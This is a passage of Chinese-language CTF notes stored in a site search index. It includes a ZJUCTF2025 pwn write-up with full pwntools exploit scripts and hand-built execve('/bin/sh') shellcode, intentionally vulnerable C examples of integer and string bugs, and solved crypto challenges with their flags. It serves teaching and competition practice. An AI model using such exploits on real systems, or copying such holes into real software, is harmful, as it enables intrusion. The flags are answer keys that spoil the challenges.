#\"10200073\",\n\n]\n#ZJUCTF{}\ncode = b\"\"\n\nfor h in hex_instructions:\n    # 1. int(h, 16) \u5c06\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6574\u6570\n    # 2. p32(...) \u5c06\u6574\u6570\u8f6c\u4e3a 32\u4f4d\u5c0f\u7aef\u5e8f\u5b57\u8282\u6d41 (RISC-V \u683c\u5f0f)\n    code += p32(int(h, 16))\n\n# Base64 \u7f16\u7801\npayload = base64.b64encode(code).decode()\n\nprint(\"Payload generated:\")\nprint(payload)\n</code></pre> \u968f\u540e\u5c06\u751f\u6210\u7684base64\u4f20\u8fdb\u8fdc\u7a0b\uff0c\u67e5\u770b\u5bc4\u5b58\u5668\u4fe1\u606f\uff0c\u624b\u52a8dump\u51fa\u6765\uff0c\u7ffb\u8bd1\u4e00\u4e0b\u5373\u53ef <pre><code>from pwn import *\nflag=b\"\"\ndef add(a):\n    global flag\n    flag+=struct.pack(\"I\", a)\n\nadd(0x43554a5a)\nadd(0x797b4654)\nadd(0x6d5f7530)\nadd(0x5f743575)\nadd(0x345f3362)\nadd(0x6d30635f)\nadd(0x33747570)\nadd(0x79355f72)\nadd(0x6d337435)\nadd(0x35406d5f)\nadd(0x7d723374)\nprint(flag)\nZJUCTF{y0u_mu5t_b3_4_c0mput3r_5y5t3m_m@5t3r}\n'''\nglobal _boot\n.text\n\n_boot:                    /* x0  = 0    0x000 */\n    /* Test ADDI */\n    beq x0,x0,loop\n    ecall\n loop:   \n    li x1,0x1\n    li x2,31\n    sll x1,x1,x2\n    addi x1,x1,0\n    lw x3,0(x1)\n    lw x4,4(x1)\n    lw x5,8(x1)\n    lw x6,12(x1)\n    lw x7,16(x1)\n    lw x8,20(x1)\n    lw x9,24(x1)\n    lw x10,28(x1)\n    lw x11,32(x1)\n    lw x12,36(x1)\n    lw x13,40(x1)\n    lw x14,44(x1)\n\n\n.data\nvariable:\n    .word 0xdeadbeef\n'''\n</code></pre></p>"},{"location":"ZJUCTF2025/#unlucky","title":"unlucky","text":"<p>\u4e00\u8840 \u5c31\u662f\u8f93\u5165seec\uff0c\u6839\u636eseed\u751f\u6210\u8ff7\u5bab\uff0c\u7136\u540e\u8ff7\u5bab\u8d70\u51fa\u53bb\u5c31\u53ef\u4ee5\u6839\u636e\u6211\u4eec\u7684\u8def\u5f84\u6765\u4ee5\u4e00\u5b9a\u89c4\u5219\u8f6c\u6362\u6210\u4ee3\u7801\u5e76\u6267\u884c\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u7684shellcode\u8981\u80fd\u8fc7\u9a8c\u8bc1\u3002\u601d\u8def\u5c31\u662f\u6211\u4eec\u8981\u521b\u5efa\u80fd\u591f\u8fc7\u9a8c\u8bc1\u7684shellcode\uff0c\u6700\u77ed\u7684\u5c31\u662f <pre><code>pop rax\nsub rax,1311\ncall rax\n</code></pre> \u8fd9\u4e2a\u77ed\u4e14\u5f88\u5c11\u6709\u8fde\u7eed\u4e00\u6837\u7684\u65b9\u5411\uff0c\u4f46\u662f\u95ee\u9898\u73b0\u5728\u5c31\u662f\uff0c\u8981\u627e\u597d\u7684\u8ff7\u5bab\u6765\u505a\u8fd9\u4e2a\u4e8b\u60c5\uff0c\u540e\u9762hint\u653e\u51fa\uff0cprng\u6709\u95ee\u9898\uff0c\u76f4\u63a5\u627eAI\u5199\u4e2a\u811a\u672c\u5e2e\u6211\u751f\u6210\u597d\u7684\u8ff7\u5bab\uff0c\u521a\u5f00\u59cb\u60f3\u8981\u5168\u7a7a\uff0c\u4f46\u662f\u53d1\u73b0\u4e0d\u884c\uff0cg\u968f\u540e\u4e00\u76f4\u5c1d\u8bd5\uff0c\u627e\u5230\u4e86\u4e00\u4e2a\u6700\u4e0b\u9762\u56db\u884c\u5168\u7a7a\u7684seed\uff0c\u751f\u6210\u811a\u672c\u5982\u4e0b <pre><code>#!/usr/bin/env python3\nfrom z3 import *\n\ndef solve_half_empty_maze():\n    # 1. \u5b9a\u4e49 Seed\n    seed = BitVec('seed', 64)\n    state = seed\n    solver = Solver()\n\n    print(\"[*] Constraints: Rows 4, 5, 6, 7 (Bottom Half) must be EMPTY.\")\n    print(\"[*] Total constraints: 32 bits fixed / 64 bits entropy.\")\n\n    # -------------------------------------------\n    # \u6a21\u62df LFSR (\u5fc5\u987b\u4e25\u683c\u5339\u914d\u9898\u76ee sub_12C3)\n    # -------------------------------------------\n    def symbolic_step(st):\n        # \u63d0\u53d6\u5173\u952e\u4f4d\n        b33 = LShR(st, 33) &amp; 1\n        b60 = LShR(st, 60) &amp; 1\n        b63 = LShR(st, 63) &amp; 1 # (qword &lt; 0) is Bit 63\n        b8  = LShR(st, 8)  &amp; 1 # BYTE1 &amp; 1 is Bit 8\n\n        feedback = b33 ^ b60 ^ b63 ^ b8\n\n        # \u8f93\u51fa\u503c v1 = state &amp; 1\n        val = st &amp; 1\n\n        # \u66f4\u65b0\u72b6\u6001\n        new_st = LShR(st, 1) | (feedback &lt;&lt; 63)\n\n        return val, new_st\n\n    # [A] \u9884\u70ed 64 \u6b21\n    for i in range(64):\n        _, state = symbolic_step(state)\n\n    # [B] \u6a21\u62df\u751f\u6210\u5faa\u73af\n    constraints_count = 0\n\n    for j in range(8):      # Row 0-7 (0 is Top, 7 is Bottom)\n        for k in range(8):  # Col 0-7\n\n            # \u8df3\u8fc7\u8d77\u70b9(7,0) \u548c \u7ec8\u70b9(0,7) - \u8fd9\u4e00\u6b65\u4e5f\u4f1a\u6d88\u8017\u968f\u673a\u6570\n            is_reserved = (k == 0 and j == 7) or (k == 7 and j == 0)\n\n            if not is_reserved:\n                val, state = symbolic_step(state)\n\n                # [\u6838\u5fc3\u7ea6\u675f]\n                # \u5982\u679c\u884c\u53f7 &gt;= 4 (\u5373 4, 5, 6, 7 \u884c)\uff0c\u5fc5\u987b\u662f\u8def (1)\n                if j &gt;= 4:\n                    solver.add(val == 1)\n                    constraints_count += 1\n\n    print(f\"[*] Constraints added: {constraints_count}. Solving with Z3...\")\n\n    # -------------------------------------------\n    # \u6c42\u89e3\n    # -------------------------------------------\n    if solver.check() == sat:\n        model = solver.model()\n        magic_seed = model[seed].as_long()\n\n        print(\"\\n\" + \"=\"*50)\n        print(f\"[+] FOUND SUPER SEED: {magic_seed}\")\n        print(f\"[+] Hex: {hex(magic_seed)}\")\n        print(\"=\"*50)\n        print(\"[-] The bottom half of the maze (Rows 4-7) is now a giant open field.\")\n        print(\"[-] You can perform your entire shellcode dance there.\")\n        print(\"[-] Once finished, just walk Up/Right to the exit.\")\n\n        return magic_seed\n    else:\n        print(\"[-] UNSAT. Even Z3 couldn't force 32 straight ones (unlikely).\")\n        print(\"    If this happens, try reducing to 3 rows (j &gt;= 5).\")\n\nif __name__ == \"__main__\":\n    solve_half_empty_maze()\n</code></pre> \u5f97\u5230\u79cd\u5b50</p> <p><code>7785659896892777472</code> \u968f\u540e\u8fd8\u8981\u63d2\u5165\u4e00\u4e9b\u80fd\u591f\u4e0d\u5f71\u54cd\u5173\u952e\u6b65\u9aa4\u7684\u6307\u4ee4\uff0c\u6765\u8c03\u6574\u4f4d\u7f6e\uff0c\u603b\u7ed3\u5982\u4e0b <pre><code>rex #\u53f3\u79fb\u4e00\u683c\u540e\u5411\u4e0a\u4e09\u683c\nrex.W #\u53f3\u79fb\u4e00\u4e2a\u5411\u4e0a\u4e00\u683c\nclc# \u53f3\u79fb\u4e24\u683c\nrex.WB #\u5de6\u79fb\u4e24\u683c\n</code></pre> \u63d2\u5165\u4e00\u5b9a\u91cf\u7684<code>\"gadget\"</code>\u6765\u8c03\u6574\u4f4d\u7f6e\uff0c\u968f\u540e\u62ff\u4e0b\uff0c\u811a\u672c\u5982\u4e0b <pre><code>backdoor=0x12a9\nret=0x17c8\nfrom pwn import *\ncontext.arch='amd64'\ncontext.log_level='debug'\npre_shellcode='''\npop rax\nsub rax,1311\ncall rax\n'''\nshellcode='''\nrex.X\n\npop rax\nclc\nrex.X\nsub ax,1311\ncall rax\n\n'''\n\ngdbscript='''\nb mmap\nc\nc\nc\nc\nc\nc\nc\nc\nc\n'''\n#p=gdb.debug(\"./vuln\",gdbscript=gdbscript)\np=process(\"./vuln\")\n#p=remote('127.0.0.1',57826)\ndef wasd_to_asm(wasd_str, arch='amd64'):\n    context.arch = arch\n    mapping = {'w': 0, 'd': 1, 's': 2, 'a': 3}\n    data = bytearray()\n\n    # \u6bcf4\u4e2a\u5b57\u7b26\u8f6c\u4e3a1\u4e2a\u5b57\u8282\n    # \u5ffd\u7565\u672b\u5c3e\u4e0d\u8db34\u4e2a\u5b57\u7b26\u7684\u90e8\u5206\n    limit = len(wasd_str) - (len(wasd_str) % 4)\n\n    for i in range(0, limit, 4):\n        c = wasd_str[i:i+4]\n        try:\n            byte_val = (mapping[c[0]] &lt;&lt; 6) | \\\n                       (mapping[c[1]] &lt;&lt; 4) | \\\n                       (mapping[c[2]] &lt;&lt; 2) | \\\n                       mapping[c[3]]\n            data.append(byte_val)\n        except KeyError:\n            continue # \u8df3\u8fc7\u975e wasd \u5b57\u7b26\n\n    return disasm(bytes(data))\ndef shellcode_to_wasd(shellcode):\n    # \u6620\u5c04\u8868: 00-&gt;w, 01-&gt;d, 10-&gt;s, 11-&gt;a\n    # \u5bf9\u5e94\u6570\u7ec4\u7d22\u5f15 0, 1, 2, 3\n    mapping = ['w', 'd', 's', 'a']\n\n    path = \"\"\n    for b in shellcode:\n        # \u4f9d\u6b21\u63d0\u53d6 byte \u7684 7-6, 5-4, 3-2, 1-0 \u4f4d\n        path += mapping[(b &gt;&gt; 6) &amp; 3]\n        path += mapping[(b &gt;&gt; 4) &amp; 3]\n        path += mapping[(b &gt;&gt; 2) &amp; 3]\n        path += mapping[b &amp; 3]\n\n    return path\n\nprint(asm(shellcode))\nprint(shellcode_to_wasd(asm(shellcode)),len(shellcode_to_wasd(asm(shellcode))))\nshellcode2='''\ncall rax\n'''\n#print(shellcode_to_wasd(asm(shellcode2)),len(shellcode_to_wasd(asm(shellcode2))))\n#@path='dwws'\n#print(wasd_to_asm(path))\n'''\n1 1 1\n1 1 1\n1 1 1\n'''\np.recvuntil(b\"seed\")\np.sendline(str(7785659896892777472).encode())\nprint(shellcode_to_wasd(asm(shellcode)))\n\npath=shellcode_to_wasd(asm(shellcode))\nfor i in range(len(path)):\n    p.recvuntil(b\"MAZE\")\n    p.sendline(path[i])\n\nnext_path='ssddddwwwwdd'\nfor i in range(len(next_path)):\n    p.recvuntil(b\"MAZE\")\n    p.sendline(next_path[i])\nprint(shellcode_to_wasd(asm(shellcraft.sh())))\np.interactive()\n</code></pre></p> <p>\u5976\u8336 \u51fa\u9898\u4eba\u8bf4\u4e0d\u7528shellcode\u53ef\u4ee5\u62ff\u5976\u8336\uff0c\u6211\u505a\u4e86\u4e00\u4e0b\uff0c\u9996\u5148\u79cd\u5b50\u4e0d\u7528\u6362\uff0c\u8fd8\u7528\u4e4b\u524d\u7684\u5c31\u53ef\u4ee5\uff0c \u7136\u540e\u6bd4\u8f83\u70e6\u4eba\u7684\u662fshellcode\u4e2d\u7684 <pre><code>mov rax, 0x732f2f2f6e69622f\n</code></pre> \u8fd9\u4e00\u90e8\u5206\uff0c\u7136\u540e\u6700\u5f00\u59cb\u7684\u60f3\u6cd5\u662f\u7528\u5206\u6bb5\u7684\u65b9\u5f0f\uff0c\u5148mov\u9ad832\u4f4d\uff0c\u4f4e32\u4f4d\u7528\u6765\u8c03\u6574\u4f4d\u7f6e\uff0c\u7136\u540e\u518d<code>mov eax mov ax</code>\u8fd9\u6837\u53bb\u8c03\u6574 \u672c\u6765\u90fd\u5199\u5b8c\u4e86\uff0c\u8c03\u8bd5\u7684\u65f6\u5019\u53d1\u73b0\uff0ctmd <code>mov eax</code>\u4f1a\u628a\u9ad8\u4f4d\u7f6e\u96f6\uff0c\u767d\u8dd1\u4e86 \u6700\u540e\u7a81\u7136\u60f3\u5230\uff0c\u53ef\u4ee5\u7528 <pre><code>stosb\n</code></pre> \u7684\u65b9\u5f0f\u6765\u505a\u8fd9\u4e2a\uff0c\u8fd9\u4e2a\u6307\u4ee4\u7b49\u6548\u4e3a <pre><code>mov [rdi],al\ninc rdi\n</code></pre> \u4e8e\u662f\u7528\u8fd9\u4e2a\u6765\u505a <pre><code>rex\nclc\npush 0x68\nrex.WB\npush 12\nmov rdi,rsp\nmov al,0x2f\nrex.WB\nstosb\nmov al,0x62\nclc\nclc\nrex\nstosb\nmov al,0x69\nclc\nrex\nstosb\nmov al,0x6e\nrex\nstosb\nrex.W\nmov al,0x2f\nclc\nrex.WB\nrex.WB\nstosb\nrex.WB\nstosb\nclc\nrex,WB\nstosb\nmov al,0x73\nclc\nrex.WB\nstosb\nrex.W\nmov rdi,rsp\nclc\nmov al,59#execve syscall number\nrex.WB\nrex\nsyscall\n</code></pre> \u7528\u8fd9\u4e2a\u6765\u6267\u884c<code>execve(\"/bin/sh\\x00\",0,0)</code> \u5176\u4f59\u5bc4\u5b58\u5668\u662f\u7a7a\u7684\uff0c\u8bbe\u7f6e\u597dal\u5373\u53ef</p> <pre><code>backdoor=0x12a9\nret=0x17c8\nfrom pwn import *\ncontext.arch='amd64'\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\npre_shellcode='''\npop rax\nsub rax,1311\ncall rax\n'''\nshel1code='''\nrex.X\npop rax\nclc\nrex.X\nsub ax,1311\ncall rax\n'''\nshellcode='''\nrex\nclc\npush 0x68\nrex.WB\npush 12\nmov rdi,rsp\nmov al,0x2f\nrex.WB\nstosb\nmov al,0x62\nclc\nclc\nrex\nstosb\nmov al,0x69\nclc\nrex\nstosb\nmov al,0x6e\nrex\nstosb\nrex.W\nmov al,0x2f\nclc\nrex.WB\nrex.WB\nstosb\nrex.WB\nstosb\nclc\nrex,WB\nstosb\nmov al,0x73\nclc\nrex.WB\nstosb\nrex.W\nmov rdi,rsp\nclc\nmov al,59#execve syscall number\nrex.WB\nrex\nsyscall\n'''\n'''\nrex.W\n\n'''\n'''\nmov rdi,rsp\n\nrex\nstosb\n'''\n\n'''\nrex.W\nmov al,0x2f\n\n\n'''\n'''\nrex\nnop\nmov eax,0x6e692222\nclc\nrex.W\nclc\nrex.W\nrex.W\nmov ax,0x622f\npush rax\nmov rdi,rsp\nclc\nclc\nrex.W\nxor rsi,rsi\npush 59\npop rax\nclc\nmov rdx,rsi\nrex.WB\nsyscall\n'''\n\ngdbscript='''\nb mmap\nc\nc\nc\nc\nc\nc\nc\nc\nc\n'''\n#p=gdb.debug(\"./vuln\",gdbscript=gdbscript)\np=process(\"./vuln\")\n#p=remote('127.0.0.1',57826)\ndef wasd_to_asm(wasd_str, arch='amd64'):\n    context.arch = arch\n    mapping = {'w': 0, 'd': 1, 's': 2, 'a': 3}\n    data = bytearray()\n\n    # \u6bcf4\u4e2a\u5b57\u7b26\u8f6c\u4e3a1\u4e2a\u5b57\u8282\n    # \u5ffd\u7565\u672b\u5c3e\u4e0d\u8db34\u4e2a\u5b57\u7b26\u7684\u90e8\u5206\n    limit = len(wasd_str) - (len(wasd_str) % 4)\n\n    for i in range(0, limit, 4):\n        c = wasd_str[i:i+4]\n        try:\n            byte_val = (mapping[c[0]] &lt;&lt; 6) | \\\n                       (mapping[c[1]] &lt;&lt; 4) | \\\n                       (mapping[c[2]] &lt;&lt; 2) | \\\n                       mapping[c[3]]\n            data.append(byte_val)\n        except KeyError:\n            continue # \u8df3\u8fc7\u975e wasd \u5b57\u7b26\n\n    return disasm(bytes(data))\ndef shellcode_to_wasd(shellcode):\n    # \u6620\u5c04\u8868: 00-&gt;w, 01-&gt;d, 10-&gt;s, 11-&gt;a\n    # \u5bf9\u5e94\u6570\u7ec4\u7d22\u5f15 0, 1, 2, 3\n    mapping = ['w', 'd', 's', 'a']\n\n    path = \"\"\n    for b in shellcode:\n        # \u4f9d\u6b21\u63d0\u53d6 byte \u7684 7-6, 5-4, 3-2, 1-0 \u4f4d\n        path += mapping[(b &gt;&gt; 6) &amp; 3]\n        path += mapping[(b &gt;&gt; 4) &amp; 3]\n        path += mapping[(b &gt;&gt; 2) &amp; 3]\n        path += mapping[b &amp; 3]\n\n    return path\n\n\n'''\n\n'''\nshelltest='''\n\nlea rax, [rip]\n'''\n#test dwswsaswwswsdswsdssddsaswsaawsaawsaadawa\n#test dwswsaswwsaadswsdssddsaswsaawsaawsaadawa\n#mov rax, 0x732f2f2f6e69622f\n#test dwswwawdadws\np.recvuntil(b\"seed\")\np.sendline(str(7785659896892777472).encode())\nprint(shellcode_to_wasd(asm(shellcraft.sh())))\n\npath=shellcode_to_wasd(asm(shel1code))\n\nfor i in range(len(path)):\n    p.recvuntil(b\"MAZE\")\n    p.sendline(path[i])\n\nprint(\"test\",shellcode_to_wasd(asm(shelltest)))\n#print(wasd_to_asm(b\"dssswwww\"))\n\nnext_path='ssddddwwwwdd'\nfor i in range(len(next_path)):\n    p.recvuntil(b\"MAZE\")\n    p.sendline(next_path[i])\nprint(shellcode_to_wasd(asm(shellcraft.sh())))\n\np.interactive()\n</code></pre>"},{"location":"ZJUCTF2025/#_2","title":"\u7ed3\u675f\u7684\u8bdd","text":"<p>\u7ec8\u4e8e\u6253\u5b8c\u4e86\uff0c\u4e5f\u7ec8\u4e8e\u5199\u5b8c\u4e86\uff0c\u592a\u591a\u4e86\uff0c\u9898\u91cf\u592a\u5927\u4e86</p>"},{"location":"ZJUCTF2025/#github","title":"github","text":"<p>\u6211\u7684\u6240\u6709\u811a\u672c\u4ee5\u53ca\u6587\u4ef6\u5168\u90e8\u653e\u5728github\u4e0a\u4e86</p>"},{"location":"ctf_notebook/","title":"pwn","text":""},{"location":"ctf_notebook/#c","title":"\u8ba1\u7b97\u673a\u5185\u5b58\u548cC\u8bed\u8a00\u7684\u8054\u7cfb","text":""},{"location":"ctf_notebook/#_1","title":"\u4f8b\u9898","text":"<p>\u7ed9\u5b9a\u4e00\u4e2aip\u5730\u5740\uff0810\u8fdb\u5236\uff09\u5c06\u5176\u4ee5\u6807\u51c6\u7684ip\u5730\u5740\u5f62\u5f0f\u8f93\u51fa,\u8f93\u5165\u4e0d\u4f1a\u8d85\u8fc74,294,967,295 \u5373\u5c06\u8f93\u5165\u6848\u4f8b\u8f6c\u5316\u4e3a16\u8fdb\u5236\u540e\u5206\u6210\u56db\u7ec4\uff0c\u5176\u4e2d\u6bcf\u4e00\u7ec4\u6309\u716710\u8fdb\u5236\u8f93\u51fa \u5982\u4e0b</p> <p>3232236298 -&gt; 0x C0 A8 03 0A-&gt;192  168  3 10</p> <p>\u8f93\u5165\u6848\u4f8b\uff1a 3232236298</p> <p>\u8f93\u51fa\u6848\u4f8b\uff1a 192.168.3.10</p> <p>\u4f18\u96c5\u505a\u6cd5\u5982\u4e0b <pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n    int n;\n    scanf(\"%d\", &amp;n);\n    void *p = &amp;n;\n    unsigned char *rp = (unsigned char *)p;\n    for (int i = 3; i &gt;= 0; i--)\n    {\n        printf(\"%u\", *(rp + i));\n        if (i != 0){\n            printf(\".\");\n        }\n    }\n}\n</code></pre></p>"},{"location":"ctf_notebook/#_2","title":"\u5c0f\u7aef\u5e8f","text":"<p>\u8be6\u89c1PPT</p> 0a 04 A8 C0 <p>\u5728\u8ba1\u7b97\u673a\u4e2d\uff0c\u6570\u636e\u662f\u91c7\u7528bytes\u4e3a\u5355\u4f4d\u8fdb\u884c\u5b58\u50a8\u7684\uff0c\u53730x12\u5728\u8ba1\u7b97\u673a\u4e2d\u5b58\u50a8\u4e3a0x12 \u4e0d\u4f1a\u6539\u53d8\uff0c\u4e3a\u4e86\u4fbf\u4e8e\u622a\u53d6\u6570\u636e\u4f4e\u4f4d\uff0c\u91c7\u7528\u5c0f\u7aef\u5e8f\u3002\u5bf9\u4e8e\u4e00\u4e2a\u6570\u636e0x12345678 \uff0c\u5b83\u7684\u5b58\u50a8\u7ed3\u679c\u5c31\u662f </p> <p>\u2193</p> 78 56 34 12 <p>\u6b64\u65f6\u5982\u679c\u6211\u4eec\u60f3\u8981\u5176\u6700\u4f4e\u4f4d 78 \uff0c\u53ea\u9700\u5c06\u6b64\u5904\u6307\u9488\u4ee5char\u5f62\u5f0f\u8bbf\u5b58\u5373\u53ef\u5f97\u5230\u3002\u800c\u5982\u679c\u91c7\u7528\u5927\u7aef\u5e8f</p> 12 34 56 78 <p>\u6211\u4eec\u77e5\u9053\u4e8678\u7684\u5730\u5740\uff0c\u5982\u82e5\u60f3\u8981\u8bbf\u95ee78\uff0c\u5219\u53ef\u4ee5\u8f93\u51fa\uff0c\u4f46\u662f\u60f3\u8981\u8f93\u51fa12345678\uff0c\u5c31\u8981\u5012\u7740\u53bb\u8bbf\u95ee\uff0c\u975e\u5e38\u9ebb\u70e6\uff0c\u6240\u4ee5\u91c7\u7528\u5c0f\u7aef\u5e8f\u3002</p> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u5c06bytes\u4ee5\u5355\u4f4d\u8fdb\u884c\u8bbf\u5b58\u7684\u7ed3\u6784\u4e0b\uff0c\u5c0f\u7aef\u5e8f\u662f\u66f4\u4e3a\u65b9\u4fbf\u7684\u3002</p>"},{"location":"ctf_notebook/#integer-bug","title":"integer bug","text":""},{"location":"ctf_notebook/#sign-detect","title":"sign detect","text":"<p>\u5728pwn\u9898\u4e2d\uff0c\u8fd9\u662f\u6700\u57fa\u7840\u7684\u4e00\u79cd\u6f0f\u6d1e\uff0c\u4f46\u662f\u4e5f\u662f\u6700\u5bb9\u6613\u88ab\u5ffd\u7565\u7684\u4e00\u79cd\u6d1e\uff08\u5c24\u5176\u662f\u540e\u9762\u6808\u6ea2\u51fa\u6253\u4e60\u60ef\u4e86\uff0c\u7b2c\u4e00\u53cd\u5e94\u5c31\u662f\u627e\u6ea2\u51fa\u70b9\uff09\u3002\u4f8b\u9898\u5982\u4e0b <pre><code>#include&lt;stdio.h&gt;\nvoid get_shell(){\n    system(\"/bin/sh\");\n}\nint main(){\n    int n;\n    scanf(\"%d\",&amp;n);\n    if(n&gt;=10){\n        exit(0);\n    }else{\n        if(unsigned(n)&gt;=100){\n            puts(\"welcome to my shell\");\n            get_shell();\n        }\n    }\n}\n</code></pre> \u8fd9\u4e2a\u6bd4\u8f83\u7b80\u5355\uff0c\u8f93\u5165\u4e00\u4e2a\u8f83\u5927\u7684\u8d1f\u6570\u5c31\u53ef\u4ee5\u62ffshell</p>"},{"location":"ctf_notebook/#integer-overflow","title":"integer overflow","text":"<p>\u5728pwn\u9898\u4e2d\uff0c\u6574\u6570\u6ea2\u51fa\u53ef\u80fd\u4f1a\u53d1\u751f\u5728\u7ed5\u8fc7\u67d0\u4e9b\u68c0\u9a8c\u7b49\u5730\u65b9\uff0c\u4f8b\u9898\u5982\u4e0b <pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\nvoid backdoor(){\n    system(\"/bin/sh\");\n}\nint main(){\n    int n;\n    char res=0;\n    for(int i = 0; i &lt; 2;i++){\n        scanf(\"%d\",&amp;n);\n        if ( n &gt;= 10 ) {\n            return 0;\n        } else {\n            res+=n;\n        }\n    }\n    if(res == 100){\n        puts(\"welcome to my shell\");\n        backdoor();\n    }\n}\n</code></pre> \u8fd9\u4e2a\u9898\u76ee\u7684\u70b9\u5728\u4e8e\uff0c\u4f1a\u5c06\u5c0f\u4e8e10\u7684\u6570\u52a0\u5230res\u4e0a\uff0c\u4f46\u662f\u53c8\u8981\u8981\u6c42res\u7b49\u4e8e100\uff0c\u6b64\u65f6\u8fd9\u91cc\u7684\u6253\u6cd5\u5c31\u662f\u53ef\u4ee5\u901a\u8fc7\u6574\u6570\u6ea2\u51fa\u3002 char \u662f1\u4e2abyte\u4e5f\u5c31\u662f8\u4f4d</p> 1 1 0 0 1 0 0 0 <p>\u8fd9\u4e2a\u6570\u662f -56</p> 1 0 0 1 1 1 0 0 <p>\u8fd9\u4e2a\u6570\u662f -100</p> <p>\u8fd9\u4e24\u4e2a\u6570\u76f8\u52a0\u7684\u7ed3\u679c\u662f</p> 0 1 1 0 0 1 0 0 <p>\u4e5f\u5c31\u662f100\uff0c\u8fbe\u5230\u8981\u6c42,\u62ff\u5230shell</p>"},{"location":"ctf_notebook/#string-bug","title":"string bug","text":"<p>\u6211\u4eec\u5728c\u8bed\u8a00\u4e2d\u5b66\u4e60\u8fc7\uff0cc\u8bed\u8a00\u4e2d\u5b57\u7b26\u4e32\u957f\u5ea6\u662f\u6ca1\u6709\u9650\u5236\u7684\uff0c\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u662f\u4ee5 ascii\u7801\u4e3a0\u7684\u5b57\u7b26\u8868\u793a\u7684\uff0c\u5373\"\\x00\",\u6240\u4ee5\u6ca1\u6709\\x00\u65f6\uff0c\u8ba1\u7b97\u673a\u5728\u8bfb\u4e0d\u5230\"\\x00\"\u65f6\u4f1a\u4e00\u76f4\u8bfb\u4e0b\u53bb\uff0c\u5bfc\u81f4\u6cc4\u9732\u4e00\u4e9b\u4e1c\u897f \u4f8b\u9898\u5982\u4e0b <pre><code>#include&lt;stdio.h&gt;\n#include&lt;random&gt;\n#include&lt;unistd.h&gt;\n#include&lt;stdlib.h&gt;\nvoid init(){\n    setvbuf(stdout, 0LL, 2, 0LL);\n    setvbuf(stdin, 0LL, 2, 0LL);\n    setvbuf(stderr, 0LL, 2, 0LL);\n}\nvoid get_shell(){\n    system(\"/bin/sh\");\n}\nint main(){\n    init();\n    char a[4] ;\n    int b;\n    b=rand();\n    puts(\"plz input a\");\n    read(0,a,10);\n    puts(a);\n    puts(\"you can guess what b is , if you are correct , I will give you a shell\");\n    scanf(\"%d\",&amp;guess);\n    if(guess==b){\n        puts(\"welcome_to_my_shell\");\n        get_shell();\n    }\n}\n</code></pre></p>"},{"location":"new_star_writeup/","title":"before the writeup","text":"<p>\u9898\u76ee\u611f\u8c22\u897f\u7535\u63d0\u4f9b\u7684\u5e73\u53f0\uff0c\u5e73\u53f0\u94fe\u63a5\u5982\u4e0b \u897f\u7535\u8bad\u7ec3\u5e73\u53f0</p>"},{"location":"new_star_writeup/#week-1","title":"week 1","text":""},{"location":"new_star_writeup/#crypto","title":"crypto","text":""},{"location":"new_star_writeup/#base","title":"base","text":"<p><pre><code>4C4A575851324332474E324547554B494A5A4446513653434E564D444154545A4B354D45454D434E4959345536544B474D5134513D3D3D3D\n</code></pre> base32-&gt;</p> <p>ZmxhZ3tCQHNFXzBmX0NyWXB0MF9OMFd9</p> <p>base64-&gt;</p> <p>flag{B@sE_0f_CrYpt0_N0W}</p>"},{"location":"new_star_writeup/#strange-king","title":"Strange King","text":"<p>ksjr{EcxvpdErSvcDgdgEzxqjql} \u521a\u5f00\u59cb\u8bd5\u7684\u51ef\u6492\uff0c\u53d1\u73b0\u627e\u4e0d\u5230\uff0c\u4ed4\u7ec6\u89c2\u5bdf\u53d1\u73b0ksjr\u548cflag\u7684\u504f\u79fb\u91cf\u662f5 7 9 11 \uff0c\u4e8e\u662f\u731c\u6d4b\u540e\u7eed\u5c31\u662f13 15\u8fd9\u6837\uff0c\u4e8e\u662f\u5199\u4e2a\u811a\u672c\uff0c\u6ce8\u610fmod 26 <pre><code>def dec(cipher,i,li):\n    if(cipher[i]&gt;='a'and cipher[i]&lt;='z'):\n        return chr((ord(cipher[i])+((-li[i])%26)-ord('a'))%26+ord('a'))\n    elif(cipher[i]&gt;='A'and cipher[i]&lt;='Z'):\n        return chr((ord(cipher[i])+((-li[i])%26)-ord('A'))%26+ord('A'))\n    else :\n        return cipher[i]\ncipher=\"ksjr{EcxvpdErSvcDgdgEzxqjql}\"\n# print(ord('k')-ord('f'))\n# print(ord('s')-ord('l'))\n# print(ord('j')-ord('a'))\n# print(ord('r')-ord('g'))\n# print(chr(ord('E')+((-15)%26)))\nli=[]\nIV=5\nfor i in range(len(cipher)):\n    li.append(IV)\n    IV+=2\nflag=\"\"\nfor i in range(len(cipher)):\n    flag+=dec(cipher,i,li)\nprint(flag)\n</code></pre> flag{PleaseDoNotStopLearing}</p>"},{"location":"new_star_writeup/#xor","title":"xor","text":"<p>\u9898\u76ee <pre><code>#As a freshman starting in 2024, you should know something about XOR, so this task is for you to sign in.\n\nfrom pwn import xor\n#The Python pwntools library has a convenient xor() function that can XOR together data of different types and lengths\nfrom Crypto.Util.number import *\n\nkey = b'New_Star_CTF'\nflag='flag{*******************}'\n\nm1 = bytes_to_long(bytes(flag[:13], encoding='utf-8'))\nm2 = flag[13:]\n\nc1 = m1 ^ bytes_to_long(key)\nc2 = xor(key, m2)\nprint('c1=',c1)\nprint('c2=',c2)\n# c1= 8091799978721254458294926060841\n# c2= b';:\\x1c1&lt;\\x03&gt;*\\x10\\x11u;'\n</code></pre> \u811a\u672c <pre><code>c1= 8091799978721254458294926060841\nc2= b';:\\x1c1&lt;\\x03&gt;*\\x10\\x11u;'\n\nm1=c1^bytes_to_long(key)\nm2=xor(key,c2)\nprint(long_to_bytes(m1))\nprint(m2)\nprint(long_to_bytes(m1).decode()+m2.decode())\n</code></pre></p> <p>flag{0ops!_you_know_XOR!}</p>"},{"location":"new_star_writeup/#_1","title":"\u4e00\u773c\u79d2\u4e86","text":"<p><pre><code>from Crypto.Util.number import *\nfrom gmpy2 import *\nfrom serct import flag\np = getPrime(512)\nq = getPrime(512)\nn = p*q\nm = bytes_to_long(flag)\ne = 65537\nc = powmod(m, e, n)\nprint(n)\nprint(c)\n\nfrom Crypto.Util.number import *\n# 